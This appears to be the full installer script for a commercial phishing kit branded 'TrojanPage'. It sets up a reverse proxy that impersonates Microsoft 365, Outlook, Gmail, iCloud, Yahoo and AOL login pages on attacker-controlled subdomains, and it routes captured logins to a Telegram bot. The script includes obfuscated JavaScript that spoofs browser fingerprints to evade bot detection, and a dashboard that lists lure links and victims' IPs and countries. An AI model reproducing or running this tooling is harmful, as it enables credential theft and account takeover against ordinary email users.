#!/bin/bash
# 🏛️ TROJANPAGE - DIRECT EXIT EDITION (V14.9.9)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. SYSTEM PRE-FLIGHT ---
show_header
DEPS=(curl dig php screen node npm jq)
for dep in "${DEPS[@]}"; do
    if ! command -v $dep &> /dev/null; then
        sudo apt-get update -y && sudo apt-get install -y curl dnsutils php-cli screen nodejs npm jq
    fi
done

# --- 2. THE SECURITY GATE (MANDATORY) ---
MASTER_KEY="TROJAN-PRO-2026"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }
echo -e "${GREEN}[success] License Verified.${NC}"

# --- 3. TELEGRAM VERIFICATION ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "${CYAN}[...] Validating Bot...${NC}\r"
    CHECK_TG=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
    if [[ $CHECK_TG == *"\"ok\":true"* ]]; then
        echo -e "${GREEN}[success] Telegram Verified.   ${NC}"
        break
    else
        echo -e "${RED}[error] Invalid Bot Token. Try again.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# --- 4. CLOUDFLARE VERIFICATION ---
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "${CYAN}[...] Validating CF Token...${NC}\r"
    CHECK_CF=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN")
    if [[ $CHECK_CF == *"\"status\":\"active\""* ]]; then
        echo -e "${GREEN}[success] Cloudflare Verified.   ${NC}"
        break
    else
        echo -e "${RED}[error] CF Token Rejected. Try again.${NC}"
    fi
done

# --- 5. DNS VERIFICATION ---
VPS_IP=$(curl -s https://api.ipify.org)
while true; do
    read -p "Enter Base Domain (e.g. martmo.click): " USER_DOMAIN
    USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
    echo -ne "${CYAN}[...] Checking DNS...${NC}\r"
    DNS_RESOLVE=$(dig +short "*.$USER_DOMAIN" | tail -n1)
    if [[ "$DNS_RESOLVE" == "$VPS_IP" ]]; then
        echo -e "${GREEN}[success] DNS Propagated.       ${NC}"
        break
    else
        echo -e "${RED}[error] DNS Mismatch! Points to [$DNS_RESOLVE].${NC}"
        read -p "Press Enter to re-verify..."
    fi
done

read -p "Enter Path Slug: /" USER_SLUG

# --- 6. TELEMETRY & OBFUSCATION ---
cat << 'EOF' > /tmp/raw_telemetry.js
(function() {
    setTimeout(function() {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return 'Intel Inc.';
            if (parameter === 37446) return 'Intel(R) Iris(TM) Graphics 6100';
            return getParameter.apply(this, arguments);
        };
    }, 2000);
})();
EOF
javascript-obfuscator /tmp/raw_telemetry.js --output /var/www/adobe_gui/js/akamai_fingerprint.js --compact true --self-defending true --string-array true --string-array-encoding 'base64' --string-array-threshold 1
rm /tmp/raw_telemetry.js

# --- 7. FINAL CONFIG DEPLOYMENT ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 8181,
  "listeningPortHTTP": 8080,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "injectJs": "/var/www/adobe_gui/js/akamai_fingerprint.js",
  "slug": "$USER_SLUG",
  "headerRules": [ { "name": "X-Akamai-Edge", "value": "true" } ],
  "proxyRules": [
    {"hostname": "*.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
    {"hostname": "*.gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
    {"hostname": "*.icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
    {"hostname": "*.yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
    {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
  ]
}
EOF

# --- 8. DASHBOARD RE-LOCK ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

CONFIG="/root/config.json"
DOMAIN=$(jq -r '.proxyDomain' $CONFIG)
SLUG=$(jq -r '.slug' $CONFIG)
MASK=$(tr -dc '0-9' < /dev/urandom | head -c 10)
TOKEN=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)

clear
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}COMPLETE GHOST TERMINAL${NC} | ${PURPLE}TARGETS:${NC} 06 | ${GREEN}STATUS: ONLINE${NC}      ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Office365 | https://$DOMAIN/s/?id=office&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | https://$DOMAIN/s/?id=outlook&m=$MASK&s=$SLUG&t=$TOKEN ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Gmail     | https://$DOMAIN/s/?id=gmail&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}               ${YELLOW}LIVE ACTIVITY MONITOR (RECENT HITS)${NC}                ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
if [ -s /root/hits.json ]; then
    tail -n 5 /root/hits.json | jq -r '"║ \(.timestamp) | \(.target | ascii_upcase | .[0:8]) | \(.ip | .[0:15]) | \(.country | .[0:12]) ║"' 2>/dev/null
else
    echo -e "${BLUE}║${NC}        No activity detected yet. Waiting for lures...         ${BLUE}║${NC}"
fi
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 proxy
screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
cd /root/engine/dist/ && ./proxy -config /root/config.json
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] Build Re-Locked. SOCKS5 Removed. All verifications active. Type 'Run'.${NC}"
